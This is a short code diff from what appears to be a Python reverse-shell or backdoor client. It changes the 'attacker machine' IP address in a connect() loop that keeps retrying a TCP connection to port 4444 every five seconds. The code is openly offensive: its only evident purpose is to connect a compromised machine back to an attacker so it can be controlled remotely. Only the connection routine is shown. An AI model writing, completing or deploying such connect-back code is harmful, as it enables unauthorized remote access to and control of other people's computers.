@@ -16,7 +16,7 @@ def connect():
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect(('192.168.1.7', 4444))  # IP and Port of the attacker machine
+			s.connect(('192.168.1.4', 4444))  # IP and Port of the attacker machine
 			return s
 		except Exception:
 			time.sleep(5)
